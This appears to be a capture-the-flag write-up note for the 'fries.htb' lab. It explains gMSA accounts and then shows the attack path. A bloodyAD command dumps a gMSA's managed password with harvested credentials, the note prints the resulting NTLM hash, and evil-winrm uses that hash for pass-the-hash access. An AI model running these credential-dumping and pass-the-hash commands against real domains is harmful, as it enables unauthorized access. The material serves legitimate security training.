A **gMSA password** (Group Managed Service Account password) is a special kind of credential used inside **Active Directory** to let services run securely **without administrators ever needing to know or manage the password themselves**.

Hereâ€™s the idea in a clean, conceptual way.

## ðŸ” What a gMSA _is_

A **Group Managed Service Account (gMSA)** is an AD account designed for:

- Windows services
    
- Scheduled tasks
    
- IIS application pools
    
- Clustered services
    

It behaves like a user account, but **its password is managed automatically by the domain**.

## ðŸ§  What makes a gMSA password special

âœ”ï¸ **1. The password is extremely long and complex**

Typically **240+ characters**, randomly generated by the domain controller.

âœ”ï¸ **2. Humans never see it**

Admins donâ€™t set it, donâ€™t rotate it, and donâ€™t retrieve it manually.

âœ”ï¸ **3. Only authorized machines can request it**

A gMSA has a property called:

```
msDS-GroupMSAMembership
```

This defines which computers are allowed to retrieve the password.

âœ”ï¸ **4. The domain controller rotates it automatically**

By default, every **30 days**, but the interval is configurable.

âœ”ï¸ **5. Services authenticate using Kerberos**

The password is used behind the scenes to generate Kerberos keys.

## ðŸ§© Why gMSA passwords exist

They solve a longâ€‘standing problem:

> Services need credentials, but humans shouldnâ€™t manage or store those credentials.

gMSAs provide:

- automatic password rotation
    
- strong cryptography
    
- reduced administrative overhead
    
- minimized credential exposure
    

## ðŸ§­ How Windows retrieves a gMSA password (conceptually)

1. A service runs under a gMSA account.
    
2. The machine hosting the service contacts a domain controller.
    
3. It requests the current password using a secure protocol.
    
4. The DC verifies that the machine is authorized.
    
5. The DC sends the password securely.
    
6. The machine caches it locally for service use.
    

This is all transparent to administrators.

## Running bloodyAD

#Attacking_machine 
Use bloodyAD to retrieve the GMSA account password .


```
bloodyAD --host <MACHINE IP> -d fries.htb -u 'svc_infra' -p 'm6tneOMAh5p0wQ0d' get search --filter '(objectClass=msDS-GroupManagedServiceAccount)' --attr sAMAccountName,msDS-ManagedPassword 
```

*distinguishedName:* CN=gMSA_CA_prod,CN=Managed Service Accounts,DC=fries,DC=htb

*msDS-ManagedPassword.NTLM:* aad3b435b51404eeaad3b435b51404ee:*02dc1e938b2004f0c8145b499ee73f41*

*msDS-ManagedPassword.B64ENCODED:* 9q007mCYrh/WwniUFSSDh2KX03D0ujAGRpE2W5OgS3nFK+feygDs6jXZwoN7t60IAkOn8K80axj1JT3Pjfxc5h9nQ4uFug1VGgXWkCizjTuKhLVgtjQnP0saO3bJOZ8bXBicRgl/zFhv72cL5BWFi3ZAEh0GJbNmxYGkhHiv/a/mkXOo3Q8VADoJHCdj5KhwVULnyXdJ/Nz0470jPsOd/2DZyufrJVwGcyTrTn8hoZVi1jdYJza8broGFH8o/zaFlsShwoRU76QxvJURRojxENe4hAM7oWNDT3kKpXDGC3zjeuzU+dusyuIhz2ntUY6p9Ej4d2yj+sSD8UFUhO4fSQ==

*sAMAccountName:* gMSA_CA_prod$

> [!Important] Important data
The sAMAccountName (gMSA_CA_prod$) 
msDS-ManagedPassword.NTLM (02dc1e938b2004f0c8145b499ee73f41)


## evil-winrm (GMSA_CA_PROD$)

#Attacking_machine 
Â Perform aÂ Pass-The-HashÂ viaÂ *WinRM*:

```
evil-winrm -i <MACHINE IP> -u 'gMSA_CA_prod$' -H 02dc1e938b2004f0c8145b499ee73f41
```

![[winrm.png]]

WinRM access asÂ `FRIES\gMSA_CA_prod$`I

### gMSA groups verification

#WinRM_Shell  

```
whoami /groups
```

![[groups_info.png]]

Result: gMSA_CA_prod$ is a member of:

- *FRIES\Domain Computers*
- *BUILTIN\Remote Management Users*
- *NT AUTHORITY\Authenticated Users Important: The gMSA is in Domain Computers, NOT in Domain Users!*

**Next step:** [[AD CS ESC1 abuse]]